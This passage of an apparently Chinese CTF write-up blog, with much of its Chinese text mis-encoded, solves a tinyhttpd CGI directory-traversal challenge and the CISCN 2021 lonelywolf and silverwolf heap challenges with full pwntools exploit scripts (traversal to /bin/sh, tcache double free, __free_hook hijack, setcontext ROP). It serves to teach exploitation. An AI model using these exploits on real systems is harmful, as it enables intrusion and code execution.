class="comment">//å¦‚æœè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸è®ºæ˜¯å±äºç”¨æˆ·/ç»„/å…¶ä»–è¿™ä¸‰è€…ç±»å‹çš„ï¼Œå°±å°† cgi æ ‡å¿—å˜é‡ç½®ä¸€</span></span><br><span class="line">   cgi = <span class="number">1</span>;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span> (!cgi)</span><br><span class="line">   <span class="comment">//å¦‚æœä¸éœ€è¦ cgi æœºåˆ¶çš„è¯ï¼Œ</span></span><br><span class="line">   serve_file(client, path);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   <span class="comment">//å¦‚æœéœ€è¦åˆ™è°ƒç”¨</span></span><br><span class="line">   execute_cgi(client, path, method, query_string);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> close(client);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>åˆ†æå‘ç°å½“æˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚<code>/bin/sh</code>,é‚£ä¹ˆå°±å›å»è°ƒç”¨å®ƒ</p>
<p>æˆ‘ä»¬è·Ÿè¿›åˆ°excute_cgiå‡½æ•°ï¼Œè¿™é‡Œåªå–ä¸€äº›å…³é”®çš„éƒ¨åˆ†<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf))</span><br><span class="line">&#123;</span><br><span class="line"> buf[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span> (strcasecmp(buf, <span class="string">&quot;Content-Length:&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">  content_length = atoi(&amp;(buf[<span class="number">16</span>])); <span class="comment">//è®°å½• body çš„é•¿åº¦å¤§å°</span></span><br><span class="line"> numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (content_length == <span class="number">-1</span>) &#123;</span><br><span class="line"> bad_request(client);</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><br>é€šè¿‡å®¡è®¡å‘ç°æˆ‘ä»¬å¿…é¡»è¦åœ¨headerä¸­ä¼ å…¥æŒ‡ç¤ºbodyé•¿åº¦å¤§å°çš„å‚æ•°<code>Content-Length</code>ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™è¿”å›</p>
<p>è¿™é‡Œå»æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execl(path, path, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p>
<p>åŒæ—¶å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ˜¯<code>POST</code>æ–¹æ³•çš„è¯,å°±ç»§ç»­è¯» body çš„å†…å®¹ï¼Œå¹¶å†™åˆ° cgi_input ç®¡é“é‡Œè®©å­è¿›ç¨‹å»è¯»<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;POST&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; content_length; i++) &#123;</span><br><span class="line">  recv(client, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  write(cgi_input[<span class="number">1</span>], &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨ç›®å½•ç©¿è¶Šæ‰§è¡Œ/bin/shï¼ŒåŒæ—¶å†ä¼ å…¥<code>Content-Length</code>ï¼Œå°±èƒ½å»æ‰§è¡Œæˆ‘ä»¬åœ¨bodyä¸­ä¼ å…¥çš„å‘½ä»¤äº†</p>
<p>æœ€åè¦æ³¨æ„ä¸‹get_lineå‡½æ•°ä¸­çš„ä¸€äº›è§„åˆ™<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_line</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">char</span> c = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((i &lt; size - <span class="number">1</span>) &amp;&amp; (c != <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"> &#123;</span><br><span class="line">  n = recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span></span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span> (c == <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    n = recv(sock, &amp;c, <span class="number">1</span>, MSG_PEEK);</span><br><span class="line">    <span class="comment">/* DEBUG printf(&quot;%02X\n&quot;, c); */</span></span><br><span class="line">    <span class="keyword">if</span> ((n &gt; <span class="number">0</span>) &amp;&amp; (c == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">     recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     c = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   buf[i] = c;</span><br><span class="line">   i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   c = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> buf[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="å®Œæ•´exp-2"><a href="#å®Œæ•´exp-2" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">body= <span class="string">&quot;echo `cat flag` &gt; ./htdocs/index.html\n&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;POST /.../.../.../.../bin/sh HTTP1.1\r\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;Content-Length: &#123;&#125;\r\n\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(body))</span><br><span class="line">payload += body</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/13.png" alt="pic"></p>
<h2 id="2021-11-24"><a href="#2021-11-24" class="headerlink" title="2021-11-24"></a>2021-11-24</h2><h3 id="CISCN-2021åˆèµ›-lonelywolf"><a href="#CISCN-2021åˆèµ›-lonelywolf" class="headerlink" title="[CISCN 2021åˆèµ›]lonelywolf"></a>[CISCN 2021åˆèµ›]lonelywolf</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/lonelywolf.zip">é™„ä»¶</a></p>
<p>å½“æ—¶æ‰“åˆèµ›çš„æ—¶å€™è¿˜åªæ˜¯ä¸€ä¸ªåªä¼šæ ˆæº¢å‡ºçš„fwï¼Œåšè¿™é“é¢˜ç›¸å½“äºæ˜¯è¡¥ä¸‹é¢˜ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†åšsilverwolfçš„å­¦ä¹ å †ä¸­çš„Sropåä¸‹å‰ç½®å‡†å¤‡</p>
<h4 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>add å‡½æ•°</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/14.png" alt="pic"></p>
<p>è®©è¾“å…¥ä¸€ä¸ªIndexä½†æ˜¯ï¼Œè¿™ä¸ªindexå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œæˆ‘ä»¬ä»å§‹è‡³ç»ˆéƒ½åªèƒ½æ§åˆ¶ä¸€ä¸ªå †å—ï¼Œè¿™å¾ˆç¬¦åˆé¢˜æ„â€”â€”ç‹¬ç‹¼</p>
<p>åŒæ—¶æ§åˆ¶äº†å¤§å°æœ€å¤§ä¸º0x78</p>
<p>delete å‡½æ•°</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/15.png" alt="pic"></p>
<p>å­˜åœ¨UAFæ¼æ´</p>
<p>æ—¢ç„¶æˆ‘ä»¬åªèƒ½æ§åˆ¶ä¸€ä¸ªå †å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘å»æ§åˆ¶tcacheç»“æ„ä½“ï¼Œä¿®æ”¹tcache_count,å°†tcacheé‡Šæ”¾åˆ°unsorted binä¸­å»leak libcï¼Œæœ€åå†å»åŠ«æŒmalloc_hookæˆ–free_hookæ¥getshell</p>
<h4 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><h5 id="Step1-double-free-å¾—åˆ°å †åœ°å€"><a href="#Step1-double-free-å¾—åˆ°å †åœ°å€" class="headerlink" title="Step1 double free å¾—åˆ°å †åœ°å€"></a>Step1 double free å¾—åˆ°å †åœ°å€</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>) <span class="comment">#ç»•è¿‡double freeæ£€æŸ¥</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<h5 id="Step2-åŠ«æŒtcache"><a href="#Step2-åŠ«æŒtcache" class="headerlink" title="Step2 åŠ«æŒtcache"></a>Step2 åŠ«æŒtcache</h5><p>æˆ‘ä»¬å¯ä»¥å…ˆå°†å½“å‰å †å—çš„fdæŒ‡é’ˆæŒ‡å‘tcache_fd</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/16.png" alt="pic"></p>
<p>æ¥ä¸‹æ¥å†ç”³è¯·ä¸¤æ¬¡å°±èƒ½ç”³è¯·åˆ°tacaheï¼Œç”±äºtcache chunkå¤§å°ä¸º0x250ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹0x250å¤§å°çš„chunkçš„countä¸º7ï¼Œå°±èƒ½å°†tacaheé‡Šæ”¾åˆ°unsorted binä¸­æ¥leak libcäº†<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))               </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)                        </span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></p>
<h5 id="Step3-åŠ«æŒfree-hook"><a href="#Step3-åŠ«æŒfree-hook" class="headerlink" title="Step3 åŠ«æŒfree_hook"></a>Step3 åŠ«æŒfree_hook</h5><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹æ­¤æ—¶binsä¸­çš„æƒ…å†µ</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/17.png" alt="pic"></p>
<p>è¿™æ˜¯å› ä¸ºç”±äºtcache è¢«é‡Šæ”¾è¿›unsorted binååœ¨åŸæœ¬è¿™äº›tcache countså¯¹åº”çš„åœ°æ–¹è¢«å†™å…¥äº†main_arena_xxçš„åœ°å€ï¼Œå†åŠ ä¸Šæˆ‘ä»¬æœ€å¤§åªèƒ½ç”³è¯·0x78,å¦‚æœæˆ‘ä»¬ç”¨0x20 ~ 0x70çš„å—æ¥åŠ«æŒfree_hookçš„è¯å°±éœ€è¦ç”¨åˆ°fastbin bin,é‚£æ˜¾ç„¶æˆ‘ä»¬ç”¨0x80çš„chunkæ¥tcache double free åŠ«æŒfree_hookæ›´åŠ å®¹æ˜“äº›ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´exp-3"><a href="#å®Œæ•´exp-3" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;lonelywolf&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add(0,0x78)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-25"><a href="#2021-11-25" class="headerlink" title="2021-11-25"></a>2021-11-25</h2><h3 id="CISCN-2021-åˆèµ›-silverwolf"><a href="#CISCN-2021-åˆèµ›-silverwolf" class="headerlink" title="[CISCN 2021 åˆèµ›]silverwolf"></a>[CISCN 2021 åˆèµ›]silverwolf</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/silverwolf.zip">é™„ä»¶</a></p>
<h4 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿™é“é¢˜æ˜¯ä¸Šåˆ°é¢˜çš„è¿›é˜¶ç‰ˆï¼Œåœ¨ä¸Šä¸€é“é¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº†ä¸€ä¸ªæ²™ç›’</p>
<p>ä¿æŠ¤å¦‚ä¸‹ï¼Œè¦æ±‚åªèƒ½ä½¿ç”¨orw,è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦æ„é€ ä¸€æ¡ropé“¾æ¥å¯¹flagæ–‡ä»¶è¿›è¡Œè¯»å†™</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/23.png" alt="pic"></p>
<p>é‚£ä¹ˆå’Œä¹‹å‰ä¸åŒï¼Œè¿™é“é¢˜éœ€è¦å°†åŠ«æŒ<code>free_hook</code> ä¸º <code>setcontext + 53</code> æ¥è°ƒç”¨æˆ‘ä»¬çš„ROPé“¾</p>
<p>setcontext+53 å¦‚ä¸‹ï¼š</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/24.png" alt="pic"></p>
<p>ä¹‹æ‰€ä»¥ä¼šé€‰æ‹©<code>setcontext + 53</code>è€Œä¸æ˜¯<code>setcontext</code> æ˜¯å› ä¸º<code>fldenv[rcx]</code>æŒ‡ä»¤ä¼šé€ æˆç¨‹åºæ‰§è¡Œçš„æ—¶å€™ç›´æ¥crashï¼Œæ‰€ä»¥è¦é¿å¼€è¿™ä¸ªæŒ‡ä»¤ã€‚</p>
<p>åˆ©ç”¨<code>setcontext + 53</code>æˆ‘ä»¬å¯ä»¥ç›´æ¥å»æ§åˆ¶å¯„å­˜å™¨çš„å€¼ä»è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œå°±ç±»ä¼¼äºæˆ‘ä»¬åœ¨SROPä¸­ä¼ªé€ SigFrameæ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµä¸€æ ·ã€‚ </p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦åœ¨å †ä¸Šå¸ƒç½®å¥½æˆ‘ä»¬çš„ropé“¾ç„¶åç”¨<code>setcontext</code>å»è°ƒç”¨æ‰§è¡Œå°±å¥½äº†</p>
<h4 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><h5 id="Step1-leak-libc"><a href="#Step1-leak-libc" class="headerlink" title="Step1 leak libc"></a>Step1 leak libc</h5><p>æ€è·¯å’Œä¸Šé“é¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œå”¯ä¸€è¦æ³¨æ„çš„æ˜¯åœ¨å¼€å¯<code>seccomp</code>ä»¥å<code>seccomp_rule_add</code>å’Œ<code>seccomp_load</code>å‡½æ•°ä¼šå½±å“tcache å’Œ fastbinçš„é£æ°´ï¼Œæ‰€ä»¥ä¸€å¼€å§‹çš„å †å¸ƒå±€å¦‚ä¸‹</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/26.png" alt="pic"></p>
<p>åœ¨leakä¹‹å‰æˆ‘ä»¬å¯ä»¥ç®€å•çš„æ¢å¤ä¸€ä¸‹ï¼Œä»¥æ–¹ä¾¿æˆ‘ä»¬æ§åˆ¶å †å—<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">clean()</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;  </span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>-<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br></pre></td></tr></table></figure></p>
<h5 id="Step2-ä¿®æ”¹tcache-control-head"><a href="#Step2-ä¿®æ”¹tcache-control-head" class="headerlink" title="Step2 ä¿®æ”¹tcache control head"></a>Step2 ä¿®æ”¹tcache control head</h5><p>ç”±äºæ­¤æ—¶çš„tcacheè¢«é‡Šæ”¾è¿›unsorted binååœ¨åŸæœ¬è¿™äº›tcache countså¯¹åº”çš„åœ°æ–¹è¢«å†™å…¥äº†main_arena_96çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆæ¢å¤tcache countsã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">9</span>)</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥éœ€è¦ç”³è¯·åˆ°tcache control head</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x50</span>))  <span class="comment"># ä¿®æ”¹fd</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
<p>æœ€åä¿®æ”¹tcache control head<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook)                 <span class="comment">#18</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)       <span class="comment">#28   ./flag     rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20a0</span>)       <span class="comment">#38              rsp</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)       <span class="comment">#48    æœ€åè°ƒç”¨        </span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>)       <span class="comment">#58    rop part1</span></span><br><span class="line">payload += p64(<span class="number">0</span>)                        <span class="comment">#68</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>+<span class="number">0x58</span>)  <span class="comment">#78    rop part2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><br>è¿™é‡Œè¦æ³¨æ„ropé“¾çš„é•¿åº¦ä¸èƒ½å¤§äºä½ å¯ä»¥æ§åˆ¶çš„å †å—çš„å¤§å°ï¼Œè¿™é‡Œæˆ‘ä»¬æœ€å¤šå¯ä»¥å†™ 0x58 + 0x68 + 0x78é•¿åº¦çš„é“¾</p>
